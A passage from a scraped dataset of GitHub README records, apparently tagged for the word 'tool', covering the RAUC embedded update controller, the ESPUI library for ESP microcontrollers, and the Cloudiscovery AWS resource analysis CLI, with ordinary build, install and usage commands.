filesystem\nUBI volumes\nUBIFS\nraw NAND flash (using nandwrite)\nraw NOR flash (using flashcp)\nsquashfs\nMBR partition table\nGPT partition table\nIndependent from update source\nUSB Stick\nSoftware provisioning server (e.g. hawkBit)\nControllable via D-Bus interface\nSupports data migration\nNetwork protocol support using libcurl (https, http, ftp, ssh, ...)\nSeveral layers of update customization\nUpdate-specific extensions (hooks)\nSystem-specific extensions (handlers)\nfully custom update script\nHost Features\nCreate update bundles\nSign/resign bundles\nInspect bundle files\nTarget Features\nRun as a system service (D-Bus interface)\nInstall bundles\nView system status information\nChange status of symmetric/asymmetric/custom slots\nTarget Requirements\nBoot state storage\nGRUB: environment file on SD/eMMC/SSD/disk\nBarebox: State partition on EEPROM/FRAM/MRAM or NAND flash\nU-Boot: environment variable\nEFI: EFI variables\nCustom: depends on implementation\nBoot target selection support in the bootloader\nEnough mass storage for two symmetric/asymmetric/custom slots\nFor normal bundle mode:\nEnough storage for the compressed bundle file (in memory, in a temporary partition or on an external storage device)\nFor casync bundle mode:\nNo additional storage needed\nNetwork interface\nHardware watchdog (optional, but recommended)\nRTC (optional, but recommended)\nUsage\nPlease see the documentation for details.\nPrerequisites\nHost (Build) Prerequisites\nbuild-essential\nautomake\nlibtool\nlibdbus-1-dev\nlibglib2.0-dev\nlibcurl3-dev\nlibssl-dev\nsudo apt-get install build-essential automake libtool libdbus-1-dev libglib2.0-dev libcurl3-dev libssl-dev\nIf you intend to use json-support you also need\nsudo apt-get install libjson-glib-dev\nTarget Prerequisites\nRequired kernel options:\nCONFIG_MD=y\nCONFIG_BLK_DEV_DM=y\nCONFIG_BLK_DEV_LOOP=y\nCONFIG_DM_VERITY=y\nCONFIG_SQUASHFS=y\nCONFIG_CRYPTO_SHA256=y\nFor using tar archive in RAUC bundles with Busybox tar, you have to enable the following Busybox feature:\nCONFIG_FEATURE_TAR_AUTODETECT=y\nCONFIG_FEATURE_TAR_LONG_OPTIONS=y\nDepending on the actual storage type and/or filesystem used, further target tools might be required. The documentation chapter Required Target Tools gives a more detailed list on these.\nBuilding from Sources\nNote\nRAUC is intended to be built both as a host tool as well as a target tool (service). Therefore it is fully prepared for automake cross-compilation\ngit clone https://github.com/rauc/rauc\ncd rauc\n./autogen.sh\n./configure\nmake\nManual Installation\nNote\nTo prepare RAUC for the target device, it is highly recommended to use an embedded Linux distribution build suite such as Yocto/OE, PTXdist or Buildroot.\nOn the host system RAUC can be used directly from the build dir, or optionally be installed. On the target instead, installing is highly recommended as it also unpacks service and D-Bus configuration files required to run RAUC properly:\nmake install\nRunning the Test Suite\nsudo apt-get install qemu-system-x86 time squashfs-tools\n# Optional to run all tests:\n# sudo apt-get install faketime casync grub-common softhsm2 opensc opensc-pkcs11 libengine-pkcs11-openssl mtd-utils\nmake check\n./qemu-test\nCreating a Bundle (Host)\nCreate a directory with the content that should be installed:\nmkdir content-dir/\ncp $SOURCE/rootfs.ext4 content-dir/\nCreate a manifest describing which image to install where together with some meta info:\ncat >> content-dir/manifest.raucm << EOF\n[update]\ncompatible=FooCorp Super BarBazzer\nversion=2019.01-1\n[image.rootfs]\nfilename=rootfs.ext4\nEOF\nLet RAUC create a bundle from this:\nrauc --cert autobuilder.cert.pem --key autobuilder.key.pem bundle content-dir/ update-2019.01-1.raucb\nStarting the RAUC Service (Target)\nCreate a system configuration file in /etc/rauc/system.conf and start the service process in background:\nrauc service &\nInstalling a Bundle (Target)\nTo install the bundle on your target device, run:\nrauc install update-2019.01-1.raucb\nContributing\nFork the repository and send us a pull request.\nPlease read the Documentation's Contributing section for more details.", "link": "https://github.com/rauc/rauc", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rauc - robust auto-update controller\nrauc controls the update process on embedded linux systems. it is both a target application that runs as an update client and a host/target -----> tool !!!  that allows you to create, inspect and modify installation artifacts.\nsource code: https://github.com/rauc/rauc\ndocumentation: https://rauc.readthedocs.org/\nchat: irc channel #rauc on libera.chat (bridged to the matrix channel #rauc:matrix.org)\nfeatures\nfail-safe & atomic:\nan update may be interrupted at any point without breaking the running system.\nupdate compatibility check\natomic bootloader updates (emmc boot partitions, mbr, gpt)\ncryptographic signing and verification of updates using openssl (signatures based on x.509 certificates)\nkeys and certificates on pkcs#11 tokens (hsms) are supported\nflexible and customizable redundancy/storage setup\nsymmetric setup (root-fs a & b)\nasymmetric setup (recovery & normal)\napplication partition, data partitions, ...\nallows grouping of multiple slots (rootfs, appfs) as update targets\nnetwork streaming mode using casync\nchunk-based binary delta updates\nsignificantly reduce download size\nno extra storage required\nbootloader support:\ngrub\nbarebox\nu-boot\nefi\ncustom implementation\nstorage support:\next4 filesystem\nemmc boot partitions (atomic update)\nvfat filesystem\nubi volumes\nubifs\nraw nand flash (using nandwrite)\nraw nor flash (using flashcp)\nsquashfs\nmbr partition table\ngpt partition table\nindependent from update source\nusb stick\nsoftware provisioning server (e.g. hawkbit)\ncontrollable via d-bus interface\nsupports data migration\nnetwork protocol support using libcurl (https, http, ftp, ssh, ...)\nseveral layers of update customization\nupdate-specific extensions (hooks)\nsystem-specific extensions (handlers)\nfully custom update script\nhost features\ncreate update bundles\nsign/resign bundles\ninspect bundle files\ntarget features\nrun as a system service (d-bus interface)\ninstall bundles\nview system status information\nchange status of symmetric/asymmetric/custom slots\ntarget requirements\nboot state storage\ngrub: environment file on sd/emmc/ssd/disk\nbarebox: state partition on eeprom/fram/mram or nand flash\nu-boot: environment variable\nefi: efi variables\ncustom: depends on implementation\nboot target selection support in the bootloader\nenough mass storage for two symmetric/asymmetric/custom slots\nfor normal bundle mode:\nenough storage for the compressed bundle file (in memory, in a temporary partition or on an external storage device)\nfor casync bundle mode:\nno additional storage needed\nnetwork interface\nhardware watchdog (optional, but recommended)\nrtc (optional, but recommended)\nusage\nplease see the documentation for details.\nprerequisites\nhost (build) prerequisites\nbuild-essential\nautomake\nlibtool\nlibdbus-1-dev\nlibglib2.0-dev\nlibcurl3-dev\nlibssl-dev\nsudo apt-get install build-essential automake libtool libdbus-1-dev libglib2.0-dev libcurl3-dev libssl-dev\nif you intend to use json-support you also need\nsudo apt-get install libjson-glib-dev\ntarget prerequisites\nrequired kernel options:\nconfig_md=y\nconfig_blk_dev_dm=y\nconfig_blk_dev_loop=y\nconfig_dm_verity=y\nconfig_squashfs=y\nconfig_crypto_sha256=y\nfor using tar archive in rauc bundles with busybox tar, you have to enable the following busybox feature:\nconfig_feature_tar_autodetect=y\nconfig_feature_tar_long_options=y\ndepending on the actual storage type and/or filesystem used, further target tools might be required. the documentation chapter required target tools gives a more detailed list on these.\nbuilding from sources\nnote\nrauc is intended to be built both as a host tool as well as a target tool (service). therefore it is fully prepared for automake cross-compilation\ngit clone https://github.com/rauc/rauc\ncd rauc\n./autogen.sh\n./configure\nmake\nmanual installation\nnote\nto prepare rauc for the target device, it is highly recommended to use an embedded linux distribution build suite such as yocto/oe, ptxdist or buildroot.\non the host system rauc can be used directly from the build dir, or optionally be installed. on the target instead, installing is highly recommended as it also unpacks service and d-bus configuration files required to run rauc properly:\nmake install\nrunning the test suite\nsudo apt-get install qemu-system-x86 time squashfs-tools\n# optional to run all tests:\n# sudo apt-get install faketime casync grub-common softhsm2 opensc opensc-pkcs11 libengine-pkcs11-openssl mtd-utils\nmake check\n./qemu-test\ncreating a bundle (host)\ncreate a directory with the content that should be installed:\nmkdir content-dir/\ncp $source/rootfs.ext4 content-dir/\ncreate a manifest describing which image to install where together with some meta info:\ncat >> content-dir/manifest.raucm << eof\n[update]\ncompatible=foocorp super barbazzer\nversion=2019.01-1\n[image.rootfs]\nfilename=rootfs.ext4\neof\nlet rauc create a bundle from this:\nrauc --cert autobuilder.cert.pem --key autobuilder.key.pem bundle content-dir/ update-2019.01-1.raucb\nstarting the rauc service (target)\ncreate a system configuration file in /etc/rauc/system.conf and start the service process in background:\nrauc service &\ninstalling a bundle (target)\nto install the bundle on your target device, run:\nrauc install update-2019.01-1.raucb\ncontributing\nfork the repository and send us a pull request.\nplease read the documentation's contributing section for more details.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000214, "year": null}, {"Unnamed: 0": 225, "autor": 225, "date": null, "content": "ESPUI\nESPUI is a simple library to make a web user interface for your projects using the ESP8266 or the ESP32 It uses web sockets and lets you create, control, and update elements on your GUI through multiple devices like phones and tablets.\nESPUI uses simple Arduino-style syntax for creating a solid, functioning user interface without too much boilerplate code.\nSo if you either don't know how or just don't want to waste time: this is your simple solution user interface without the need of internet connectivity or any additional servers.\nThe Library runs fine on any kind of ESP8266 and ESP32 (NodeMCU Boards, usw)\nChangelog for 2.0:\nArduinoJSON 6.10.0 Support\nsplit pad into pad and padWithCenter\nCleaned Order or parameters on switch\ncleaned Order of parameters on pad\nChanges all numbers to actually be numbers (slider value, number value, min and max)\nAdded features\nTabs by @eringerli #45\nGeneric API by @eringerli\nMin Max on slider by @eringerli\nOptionList by @eringerli\nPublic Access to ESPAsyncServer\nGraph Widget (Persist save graph in local storage #10)\nFurther Roadmap\nSlider css issues\nimplement Gauge\nFile upload ?\nDependencies\nThis library is dependent on the following libraries to function properly.\nESPAsyncWebserver\nArduinoJson (Last tested with version 6.10.0)\n(For ESP8266) ESPAsyncTCP\n(For ESP32) AsyncTCP\nHow to Install\nMake sure all the dependencies are installed, then install like so:\nUsing PlattformIO (recommended)\nJust include this library as a dependency on lib_deps like so:\nlib_deps =\nESPUI\nESPAsyncWebserver\nESPAsyncTCP # or AsyncTCP on ESP32\nDirectly Through Arduino IDE (recommended)\nYou can find this Library in the Arduino IDE library manager Go to Sketch > Include Library > Library Manager > Search for \"ESPUI\" > Install\nManual Install Arduino IDE\nFor Windows: Download the Repository and extract the .zip in Documents>Arduino>Libraries>{Place \"ESPUI\" folder Here}\nFor Linux: Download the Repository and extract the .zip in Sketchbook/Libraries/{Place \"ESPUI\" folder Here}\nFor macOs: Download the Repository and extract the .zip in ~/Documents/Arduino/libraries/{Place \"ESPUI\" folder Here}\nGo to Sketch>Include Library>Add .zip Library> Select the Downloaded .zip File.\nGetting started\nESPUI serves several files to the browser to build up its web interface. This can be achieved in 2 ways: PROGMEM or SPIFFS\nWhen ESPUI.begin() is called the default is serving files from Memory and ESPUI should work out of the box!\nOPTIONAL: But if this causes your program to use too much memory you can burn the files into the SPIFFS filesystem on the ESP. There are now two ways to do this: you can either use the ESP file upload tool or you use the library function ESPUI.prepareFileSystem()\nSimple filesystem preparation (recommended)\nJust open the example sketch prepareFileSystem and run it on the ESP, (give it up to 30 seconds, you can see the status on the Serial Monitor), The library will create all needed files. Congratulations, you are done, from now on you just need to do this again when there is a library update, or when you want to use another chip :-) Now you can upload your normal sketch, when you do not call the ESPUI.prepareFileSystem() function the compiler will strip out all the unnecessary strings that are already saved in the chip's filesystem and you have more program memory to work with.\nUser interface Elements\nLabel\nButton\nSwitch\nControl pad\nControl pad with center button\nSlider\nText Input\nNumberinput\nGraph\nOption select\nCheckout the example for the usage or see the detailed info below\nAvailable colors:\nTurquoise\nEmerald\nPeterriver\nWetasphalt\nSunflower\nCarrot\nAlizarin\nDark\nNone\n(Use like ControlColor::Sunflower)\nDocumentation\nThe heart of ESPUI is ESPAsyncWebserver. ESPUI's frontend is based on Skeleton CSS and jQuery-like lightweight zepto.js for Handling Click Events Etc. The communication between the ESP and the client browser works using web sockets. ESPUI does not need network access and can be used in standalone access point mode, all resources are loaded directly from the ESPs memory.\nThis section will explain in detail how the Library is to be used from the Arduino code side. In the arduino setup() routine the interface can be customised by adding UI Elements. This is done by calling the corresponding library methods on the Library object ESPUI. Eg: ESPUI.button(\"button\", &myCallback); creates a button in the interface that calls the myCallback(Control *sender, int value) function when changed. All buttons and items call their callback whenever there is a state change from them. This means the button will call the callback when it is pressed and also again when it is released. To separate different events an integer number with the event name is passed to the callback function that can be handled in a switch(){}case{} statement. Here is an overview of the currently implemented different elements of the UI library:\nButton\nButtons have a name and a callback value. They have one event for press (B_DOWN) and one for release (B_UP).\nB_DOWN\nB_UP\nSwitch\nSwitches sync their state on all connected devices. This means when you change their value they change visibly on all tablets or computers that currently display the interface. They also have two types of events: one when turning on (S_ACTIVE) and one when turning off (S_INACTIVE).\nS_ACTIVE\nS_INACTIVE\nButtonpad\nButton pads come in two flavours: with or without a center button. They are very useful for con-trolling all kinds of movements of vehicles or also of course our walking robots. They use a single callback per pad and have 8 or 10 different event types to differentiate the button actions.\nP_LEFT_DOWN\nP_LEFT_UP\nP_RIGHT_DOWN\nP_RIGHT_UP\nP_FOR_DOWN\nP_FOR_UP\nP_BACK_DOWN\nP_BACK_UP\nP_CENTER_DOWN\nP_CENTER_UP\nLabels\nLabels are a nice tool to get information from the robot to the user interface. This can be done to show states, values of sensors and configuration parameters. To send data from the code use ESP.print(labelId, \"Text\"); . Labels get a name on creation and a initial value. The name is not changeable once the UI initialised.\nLabels automatically wrap your text. If you want them to have multiple lines use the normal <br> tag in the string you print to the label\nSlider\nThe Slider can be used to slide through a value from 1 to 100. Slides provide realtime data, are touch compatible and can be used to for example control a Servo. The current value is shown while the slider is dragged in a little bubble over the handle. In the Callback the slider does not return an int but a String. Use the .toInt function to convert the value, see the gui example to check how it works.\nA slider usually only sends a new value when it is released to save the esps from being spammed with values. This behaviour can be cahnged globally using a property of the ESPUI object before begin():\nESPUI.sliderContinuous = true;\nESPUI.begin(\"ESPUI Control\");\nNumber Input\nThe numberinput can be used to directly input numbers to your program. You can enter a Value into it and when you are done with your change it is sent to the ESP.\nA number box needs to have a min and a max value. To set it up just use:\nESPUI.number(\"Numbertest\", &numberCall, ControlColor::Alizarin, 5, 0, 10);\nText Input\nThe textinput works very similar like the number input but with a string. You can enter a String into it and when you are done with your change it is sent to the ESP.\nGraph\nThe graph widget can display graph points with timestamp at wich they arrive\nUse ESPUI.addGraphPoint(graphId, random(1, 50)); to add a new value at the current time, use ESPUI.clearGraph(graphId) to clear the entire graph. Graph points are saved in the browser in localstorage to be persistant, clear local storageto remove the points or use clearGraph() from a bbutton callback to provide a clear button.\nOption select\nThe option select works by first creating a select widget like so\nuint16_t select1 = ESPUI.addControl( ControlType::Select, \"Select:\", \"\", ControlColor::Alizarin, tab1, &selectExample );\nAnd then adding Options to it like seperate widgets, specifying the select as the parent:\nESPUI.addControl( ControlType::Option, \"Option1\", \"Opt1\", ControlColor::Alizarin, select1 );\nESPUI.addControl( ControlType::Option, \"Option2\", \"Opt2\", ControlColor::Alizarin, select1 );\nESPUI.addControl( ControlType::Option, \"Option3\", \"Opt3\", ControlColor::Alizarin, select1 );\nCheck the tabbedGui example for a working demo\nUsing Tabs\nTabs can be used to organize your widgets in pages. Check the tabbedGui example. Tabs can be created using the generic functions like so: ESPUI.addControl( ControlType::Tab, \"Settings 1\", \"Settings 1\" );\nThen all widgets for the tab need to be added to it by specifying the tab as the parrent (widgets not added to a tab will be shown above the tab selctor)\nESPUI.addControl( ControlType::Text, \"Text Title:\", \"a Text Field\", ControlColor::Alizarin, tab1, &textCall );\nInitialisation of the UI\nAfter all the elements are configured you can use ESPUI.begin(\"Some Title\"); to start the UI interface. (Or ESPUI.beginSPIFFS(\"Some Title\"); respectively) Make sure you setup a working network connection or AccesPoint before (See gui.ino example). The web interface can then be used from multiple devices at once and also shows an connection status in the top bar.\nAdvanced: Generic creation and updates of control widgets\nThere are 2 generic functions to create and update controls, to see them in action check the gui-generic-api example.\nTo create a generic control use: uint16_t switchOne = ESPUI.addControl(ControlType::Switcher, \"Switch one\", \"\", ControlColor::Alizarin, Control::noParent, &switchExample);\nThen its value can be updated by doing:\nESPUI.updateControlValue(status, \"Start\");\nYou can also update other parameters of the control like its color using:\nESPUI.getControl(switchOne)->color = ControlColor::Carrot;\nESPUI.updateControl(switchOne);\nLog output\nESPUI has several different log levels. You can set them using the ESPUI.setVerbosity(Verbosity::VerboseJSON) function.\nLoglevels are:\nVerbosity::Quiet (default)\nVerbosity::Verbose\nVerbosity::VerboseJSON\nVerboseJSON outputs the most debug information.\nAdvanced properties\nIf you have many different widgets it might be necessary to adjust the JSON Buffers used internally in ESPUI before .begin() :\nESPUI.jsonUpdateDocumentSize = 2000; // This is the default, and this value is not affected by the amount of widgets\nESPUI.jsonInitialDocumentSize = 8000; // This is the default, adjust when you have too many widgets or options\nESPUI.begin(\"ESPUI Control\");\nNotes for Development\nIf you want to work on the HTML/CSS/JS files, do make changes in the data directory. When you need to transfer that code to the ESP, run tools/prepare_static_ui_sources.py -a (this script needs python3 with the modules htmlmin, jsmin and csscompressor). This will generate a) minified files next to the original files and b) the C header files in src that contain the minified and gzipped HTML/CSS/JS data. Alternatively, you can specify the --source and --target arguments to the prepare_static_ui_sources.py script (run the script without arguments for help) if you want to use different locations.\nIf you don't have a python environment, you need to minify and gzip the HTML/CSS/JS files manually. I wrote a little useful jsfiddle for this, see here.\nIf you change something in HTML/CSS/JS and want to create a pull request, please do include the minified versions and corresponding C header files in your commits. (Do NOT commit all the minified versions for the non changed files)\nContribute\nLiked this Library? You can support me by sending me a \u2615 Coffee.\nOtherwise I really welcome Pull Requests.", "link": "https://github.com/s00500/ESPUI", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "espui\nespui is a simple library to make a web user interface for your projects using the esp8266 or the esp32 it uses web sockets and lets you create, control, and update elements on your gui through multiple devices like phones and tablets.\nespui uses simple arduino-style syntax for creating a solid, functioning user interface without too much boilerplate code.\nso if you either don't know how or just don't want to waste time: this is your simple solution user interface without the need of internet connectivity or any additional servers.\nthe library runs fine on any kind of esp8266 and esp32 (nodemcu boards, usw)\nchangelog for 2.0:\narduinojson 6.10.0 support\nsplit pad into pad and padwithcenter\ncleaned order or parameters on switch\ncleaned order of parameters on pad\nchanges all numbers to actually be numbers (slider value, number value, min and max)\nadded features\ntabs by @eringerli #45\ngeneric api by @eringerli\nmin max on slider by @eringerli\noptionlist by @eringerli\npublic access to espasyncserver\ngraph widget (persist save graph in local storage #10)\nfurther roadmap\nslider css issues\nimplement gauge\nfile upload ?\ndependencies\nthis library is dependent on the following libraries to function properly.\nespasyncwebserver\narduinojson (last tested with version 6.10.0)\n(for esp8266) espasynctcp\n(for esp32) asynctcp\nhow to install\nmake sure all the dependencies are installed, then install like so:\nusing plattformio (recommended)\njust include this library as a dependency on lib_deps like so:\nlib_deps =\nespui\nespasyncwebserver\nespasynctcp # or asynctcp on esp32\ndirectly through arduino ide (recommended)\nyou can find this library in the arduino ide library manager go to sketch > include library > library manager > search for \"espui\" > install\nmanual install arduino ide\nfor windows: download the repository and extract the .zip in documents>arduino>libraries>{place \"espui\" folder here}\nfor linux: download the repository and extract the .zip in sketchbook/libraries/{place \"espui\" folder here}\nfor macos: download the repository and extract the .zip in ~/documents/arduino/libraries/{place \"espui\" folder here}\ngo to sketch>include library>add .zip library> select the downloaded .zip file.\ngetting started\nespui serves several files to the browser to build up its web interface. this can be achieved in 2 ways: progmem or spiffs\nwhen espui.begin() is called the default is serving files from memory and espui should work out of the box!\noptional: but if this causes your program to use too much memory you can burn the files into the spiffs filesystem on the esp. there are now two ways to do this: you can either use the esp file upload -----> tool !!!  or you use the library function espui.preparefilesystem()\nsimple filesystem preparation (recommended)\njust open the example sketch preparefilesystem and run it on the esp, (give it up to 30 seconds, you can see the status on the serial monitor), the library will create all needed files. congratulations, you are done, from now on you just need to do this again when there is a library update, or when you want to use another chip :-) now you can upload your normal sketch, when you do not call the espui.preparefilesystem() function the compiler will strip out all the unnecessary strings that are already saved in the chip's filesystem and you have more program memory to work with.\nuser interface elements\nlabel\nbutton\nswitch\ncontrol pad\ncontrol pad with center button\nslider\ntext input\nnumberinput\ngraph\noption select\ncheckout the example for the usage or see the detailed info below\navailable colors:\nturquoise\nemerald\npeterriver\nwetasphalt\nsunflower\ncarrot\nalizarin\ndark\nnone\n(use like controlcolor::sunflower)\ndocumentation\nthe heart of espui is espasyncwebserver. espui's frontend is based on skeleton css and jquery-like lightweight zepto.js for handling click events etc. the communication between the esp and the client browser works using web sockets. espui does not need network access and can be used in standalone access point mode, all resources are loaded directly from the esps memory.\nthis section will explain in detail how the library is to be used from the arduino code side. in the arduino setup() routine the interface can be customised by adding ui elements. this is done by calling the corresponding library methods on the library object espui. eg: espui.button(\"button\", &mycallback); creates a button in the interface that calls the mycallback(control *sender, int value) function when changed. all buttons and items call their callback whenever there is a state change from them. this means the button will call the callback when it is pressed and also again when it is released. to separate different events an integer number with the event name is passed to the callback function that can be handled in a switch(){}case{} statement. here is an overview of the currently implemented different elements of the ui library:\nbutton\nbuttons have a name and a callback value. they have one event for press (b_down) and one for release (b_up).\nb_down\nb_up\nswitch\nswitches sync their state on all connected devices. this means when you change their value they change visibly on all tablets or computers that currently display the interface. they also have two types of events: one when turning on (s_active) and one when turning off (s_inactive).\ns_active\ns_inactive\nbuttonpad\nbutton pads come in two flavours: with or without a center button. they are very useful for con-trolling all kinds of movements of vehicles or also of course our walking robots. they use a single callback per pad and have 8 or 10 different event types to differentiate the button actions.\np_left_down\np_left_up\np_right_down\np_right_up\np_for_down\np_for_up\np_back_down\np_back_up\np_center_down\np_center_up\nlabels\nlabels are a nice tool to get information from the robot to the user interface. this can be done to show states, values of sensors and configuration parameters. to send data from the code use esp.print(labelid, \"text\"); . labels get a name on creation and a initial value. the name is not changeable once the ui initialised.\nlabels automatically wrap your text. if you want them to have multiple lines use the normal <br> tag in the string you print to the label\nslider\nthe slider can be used to slide through a value from 1 to 100. slides provide realtime data, are touch compatible and can be used to for example control a servo. the current value is shown while the slider is dragged in a little bubble over the handle. in the callback the slider does not return an int but a string. use the .toint function to convert the value, see the gui example to check how it works.\na slider usually only sends a new value when it is released to save the esps from being spammed with values. this behaviour can be cahnged globally using a property of the espui object before begin():\nespui.slidercontinuous = true;\nespui.begin(\"espui control\");\nnumber input\nthe numberinput can be used to directly input numbers to your program. you can enter a value into it and when you are done with your change it is sent to the esp.\na number box needs to have a min and a max value. to set it up just use:\nespui.number(\"numbertest\", &numbercall, controlcolor::alizarin, 5, 0, 10);\ntext input\nthe textinput works very similar like the number input but with a string. you can enter a string into it and when you are done with your change it is sent to the esp.\ngraph\nthe graph widget can display graph points with timestamp at wich they arrive\nuse espui.addgraphpoint(graphid, random(1, 50)); to add a new value at the current time, use espui.cleargraph(graphid) to clear the entire graph. graph points are saved in the browser in localstorage to be persistant, clear local storageto remove the points or use cleargraph() from a bbutton callback to provide a clear button.\noption select\nthe option select works by first creating a select widget like so\nuint16_t select1 = espui.addcontrol( controltype::select, \"select:\", \"\", controlcolor::alizarin, tab1, &selectexample );\nand then adding options to it like seperate widgets, specifying the select as the parent:\nespui.addcontrol( controltype::option, \"option1\", \"opt1\", controlcolor::alizarin, select1 );\nespui.addcontrol( controltype::option, \"option2\", \"opt2\", controlcolor::alizarin, select1 );\nespui.addcontrol( controltype::option, \"option3\", \"opt3\", controlcolor::alizarin, select1 );\ncheck the tabbedgui example for a working demo\nusing tabs\ntabs can be used to organize your widgets in pages. check the tabbedgui example. tabs can be created using the generic functions like so: espui.addcontrol( controltype::tab, \"settings 1\", \"settings 1\" );\nthen all widgets for the tab need to be added to it by specifying the tab as the parrent (widgets not added to a tab will be shown above the tab selctor)\nespui.addcontrol( controltype::text, \"text title:\", \"a text field\", controlcolor::alizarin, tab1, &textcall );\ninitialisation of the ui\nafter all the elements are configured you can use espui.begin(\"some title\"); to start the ui interface. (or espui.beginspiffs(\"some title\"); respectively) make sure you setup a working network connection or accespoint before (see gui.ino example). the web interface can then be used from multiple devices at once and also shows an connection status in the top bar.\nadvanced: generic creation and updates of control widgets\nthere are 2 generic functions to create and update controls, to see them in action check the gui-generic-api example.\nto create a generic control use: uint16_t switchone = espui.addcontrol(controltype::switcher, \"switch one\", \"\", controlcolor::alizarin, control::noparent, &switchexample);\nthen its value can be updated by doing:\nespui.updatecontrolvalue(status, \"start\");\nyou can also update other parameters of the control like its color using:\nespui.getcontrol(switchone)->color = controlcolor::carrot;\nespui.updatecontrol(switchone);\nlog output\nespui has several different log levels. you can set them using the espui.setverbosity(verbosity::verbosejson) function.\nloglevels are:\nverbosity::quiet (default)\nverbosity::verbose\nverbosity::verbosejson\nverbosejson outputs the most debug information.\nadvanced properties\nif you have many different widgets it might be necessary to adjust the json buffers used internally in espui before .begin() :\nespui.jsonupdatedocumentsize = 2000; // this is the default, and this value is not affected by the amount of widgets\nespui.jsoninitialdocumentsize = 8000; // this is the default, adjust when you have too many widgets or options\nespui.begin(\"espui control\");\nnotes for development\nif you want to work on the html/css/js files, do make changes in the data directory. when you need to transfer that code to the esp, run tools/prepare_static_ui_sources.py -a (this script needs python3 with the modules htmlmin, jsmin and csscompressor). this will generate a) minified files next to the original files and b) the c header files in src that contain the minified and gzipped html/css/js data. alternatively, you can specify the --source and --target arguments to the prepare_static_ui_sources.py script (run the script without arguments for help) if you want to use different locations.\nif you don't have a python environment, you need to minify and gzip the html/css/js files manually. i wrote a little useful jsfiddle for this, see here.\nif you change something in html/css/js and want to create a pull request, please do include the minified versions and corresponding c header files in your commits. (do not commit all the minified versions for the non changed files)\ncontribute\nliked this library? you can support me by sending me a \u2615 coffee.\notherwise i really welcome pull requests.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000225, "year": null}, {"Unnamed: 0": 226, "autor": 226, "date": null, "content": "Cloudiscovery\nCloudiscovery helps you to analyze resources in your cloud (AWS/GCP/Azure/Alibaba/IBM) account. Now this tool only can check resources in AWS, but we are working to expand to other providers.\nThe tool consists of various commands to help you understand the cloud infrastructure.\nFeatures\nDiagrams\nCommands can generate diagrams. When modelling them, we try to follow the principle:\nGraphical excellence is that which gives to the viewer the greatest number of ideas in the shortest time with the least ink in the smallest space.\nEdward Tufte\nReport\nThe commands generate reports that can be used to further analyze resources.\nCLI\nRun the cloudiscovery command with following options (if a region not pass, this script will try to get it from ~/.aws/credentials):\n1.1 To detect AWS VPC resources (more on AWS VPC):\ncloudiscovery aws-vpc [--vpc-id vpc-xxxxxxx] --region-name xx-xxxx-xxx [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.2 To detect AWS policy resources (more on AWS Policy):\ncloudiscovery aws-policy [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.3 To detect AWS IoT resources (more on AWS IoT):\ncloudiscovery aws-iot [--thing-name thing-xxxx] --region-name xx-xxxx-xxx [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.4 To detect all AWS resources (more on AWS All):\ncloudiscovery aws-all --region-name xx-xxxx-xxx [--profile-name profile] [--services xxx,xxx] [--filter xxx] [--verbose]\n1.5 To check AWS limits per resource (more on AWS Limit):\ncloudiscovery aws-limit --region-name xx-xxxx-xxx [--profile-name profile] [--services xxx,xxx] [--usage 0-100] [--verbose]\n1.6 To run AWS security controls (experimental feature):\ncloudiscovery aws-security --region-name xx-xxxx-xxx [--profile-name profile] [--commands x] [--verbose]\nFor help use:\ncloudiscovery [aws-vpc|aws-policy|aws-iot|aws-all|aws-limit] -h\nDebbuging\nEnabling verbose mode, it is possible to debug all calls to the providers endpoints and check possible problems.\nFiltering\nIt's possible to filter resources by tags and resource type. To filter, add an option --filter <VALUE>, where <VALUE> can be:\nName=tags.costCenter;Value=20000 - to filter resources by a tag name costCenter and with value 20000.\nName=type;Value=aws_lambda_function to only list lambda functions.\nIt's possible to pass multiple values, to be able to select a value from a set. Values are split by : sign. If a desired value has a : sign, wrap it in ' signs e.g. --filter=\"Name=tags.costCenter;Value=20000:'20001:1'.\nIt is possible to pass multiple filter options, just pass -f filter_1 -f filter_2. In that case, the tool will return resources that match either of the filters\nUseful CF tags:\naws:cloudformation:stack-name - Stack name\naws:cloudformation:stack-id - Stack id\naws:cloudformation:logical-id - Logical id defined in CF template\nRequirements and Installation\nInstallation\nThis tool has been written in Python3+ and AWS-CLI and it works on Linux, Windows and Mac OS.\nMake sure the latest version of AWS-CLI is installed on your workstation, and other components needed, with Python pip already installed:\npip install -U cloudiscovery\nOnce a while after installation, there can be some issues related with a cache from older version being used by a newer version. In that case, it's recommended to remove directory ./assets/.cache.\nAWS Credentials\nMake sure you have properly configured your AWS-CLI with a valid Access Key and Region:\naws configure\nMore on credentials configuration: Configuration basics\nAWS Permissions\nThe configured credentials must be associated to a user or role with proper permissions to do all checks. If you want to use a role with narrowed set of permissions just to perform cloud discovery, use a role from the following the CF template maintained by our team.\nTo further increase security, you can add a block to check aws:MultiFactorAuthPresent condition in AssumeRolePolicyDocument. More on using IAM roles in the configuration file.\n(Optional) If you want to be able to switch between multiple AWS credentials and settings, you can configure named profiles and later pass profile name when running the tool.\nCommands\nCloudiscovery provides a CLI to easily perform desired actions.\nAWS VPC\nExample of a diagram (diagrams.net supported):\nFollowing resources are checked in VPC command:\nAutoscaling Group\nClassic/Network/Application Load Balancer\nClient VPN Endpoints\nCloudHSM\nDocumentDB\nDirectory Service\nEC2 Instance\nECS\nEFS\nElastiCache\nElasticsearch\nEKS\nEMR\nIAM Policy\nInternet Gateway (IGW)\nLambda\nMedia Connect\nMedia Live\nMedia Store Policy\nMSK\nNACL\nNAT Gateway\nNeptune\nQuickSight\nRDS\nREST Api Policy\nRoute Table\nS3 Policy\nSagemaker Notebook\nSagemaker Training Job\nSagemaker Model\nSecurity Group\nSQS Queue Policy\nSite-to-Site VPN Connections\nSubnet\nSynthetic Canary\nVPC Peering\nVPC Endpoint\nVPN Customer Gateways\nVirtual Private Gateways\nWorkspace\nThe subnets are aggregated to simplify the diagram and hide infrastructure redundancies. There can be two types of subnet aggregates:\nPrivate* ones with a route 0.0.0.0/0 to Internet Gateway\nPublic* ones 